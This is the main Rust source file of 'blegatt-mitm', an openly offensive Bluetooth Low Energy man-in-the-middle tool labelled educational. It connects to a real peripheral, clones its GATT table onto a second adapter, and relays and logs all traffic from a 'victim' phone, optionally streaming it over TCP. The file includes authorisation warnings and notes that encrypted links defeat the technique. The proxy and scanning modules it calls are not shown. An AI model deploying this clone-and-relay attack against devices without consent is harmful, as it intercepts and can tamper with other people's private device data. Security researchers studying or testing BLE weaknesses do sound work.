//! blegatt-mitm — an educational BLE GATT man-in-the-middle proxy.
//!
//! FOR AUTHORISED, EDUCATIONAL USE ONLY. Only run this against devices you own
//! or have explicit written permission to test. Intercepting other people's
//! Bluetooth traffic without consent is illegal in most jurisdictions.
//!
//! ## How it works
//! 1. Connect to a real BLE peripheral as a *central* (on `--target-adapter`).
//! 2. Read its full GATT table and advertised identity.
//! 3. Mirror both onto a *second* adapter acting as a *peripheral*
//!    (`--clone-adapter`) — every characteristic forwards to the real one.
//! 4. The victim central (e.g. a phone) connects to the clone; we relay and log
//!    every read, write and notification in plaintext.
//!
//! ## Hard limitation
//! This is a *clone-and-relay* attack. It only works against devices that do
//! **not** use LE pairing/encryption. If the link is encrypted (LE Secure
//! Connections + bonding) the payloads are ciphertext and this technique fails —
//! that is by design of the Bluetooth security model, not a bug here.

mod cli;
mod error;
mod event;
mod names;
mod proxy;
mod scan;

use std::str::FromStr;

use anyhow::{Context, Result};
use bluer::{Adapter, Address, Session};
use clap::Parser;
use tracing_subscriber::EnvFilter;

use crate::cli::Cli;
use crate::error::AppError;
use crate::event::{EventBus, RelayEvent};

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    init_tracing(&cli.log);

    print_banner();

    let session = Session::new().await.context("connect to bluetoothd (is BlueZ running?)")?;

    // Central-role adapter (connects to the real device).
    let target_adapter = get_adapter(&session, &cli.target_adapter).await?;
    target_adapter.set_powered(true).await.ok();

    // Peripheral-role adapter (advertises the clone).
    let clone_name = cli.clone_adapter().to_string();
    let clone_adapter = if clone_name == cli.target_adapter {
        tracing::warn!(
            "using one adapter for both roles ({clone_name}); two adapters are strongly recommended"
        );
        target_adapter.clone()
    } else {
        let a = get_adapter(&session, &clone_name).await?;
        a.set_powered(true).await.ok();
        a
    };

    // Resolve the target address (explicit or interactive).
    let target: Address = match &cli.target {
        Some(t) => Address::from_str(t).with_context(|| format!("invalid MAC address: {t}"))?,
        None => scan::pick_target(&target_adapter, cli.scan_secs).await?,
    };

    // Event bus: fans out to the console logger and TCP stream clients.
    let bus = EventBus::new(1024);
    event::spawn_console_logger(&bus);

    if !cli.no_stream {
        let bus2 = bus.clone();
        let bind = cli.bind.clone();
        let port = cli.port;
        tokio::spawn(async move {
            if let Err(e) = event::serve_stream(&bind, port, bus2).await {
                tracing::error!("event stream server failed: {e}");
            }
        });
    }

    // Connect to the real device and stand up the clone.
    let device = proxy::connect_target(&target_adapter, target).await?;
    let name = device.name().await.ok().flatten().unwrap_or_else(|| "[unknown]".into());
    tracing::info!("connected to target: {name} ({target})");

    let _proxy = proxy::build_clone(&device, &clone_adapter, bus.clone(), cli.clone_descriptors)
        .await
        .context("build clone")?;

    bus.emit(RelayEvent::info(format!(
        "MITM active — clone of '{name}' advertising on {}. Waiting for victim central…",
        clone_adapter.name()
    )));
    tracing::info!("═══════════════════════════════════════════════════════");
    tracing::info!("  MITM ACTIVE — logging all GATT traffic. Ctrl-C to stop.");
    tracing::info!("═══════════════════════════════════════════════════════");

    // Run until Ctrl-C; dropping `_proxy` tears down advertising + the server.
    tokio::signal::ctrl_c().await.context("wait for ctrl-c")?;
    tracing::info!("shutting down; stopping advertisement and unregistering clone…");

    Ok(())
}

/// Resolve an adapter by name, mapping the missing case to a clear error.
async fn get_adapter(session: &Session, name: &str) -> Result<Adapter> {
    match session.adapter(name) {
        Ok(a) => Ok(a),
        Err(_) => Err(AppError::AdapterNotFound(name.to_string()).into()),
    }
}

fn init_tracing(default_filter: &str) {
    let filter = EnvFilter::try_from_default_env()
        .unwrap_or_else(|_| EnvFilter::new(default_filter));
    tracing_subscriber::fmt()
        .with_env_filter(filter)
        .with_target(false)
        .with_ansi(true)
        .init();
}

fn print_banner() {
    eprintln!("blegatt-mitm — educational BLE GATT interceptor");
    eprintln!("⚠  Authorised, educational use only. Test only devices you own or may test.\n");
}
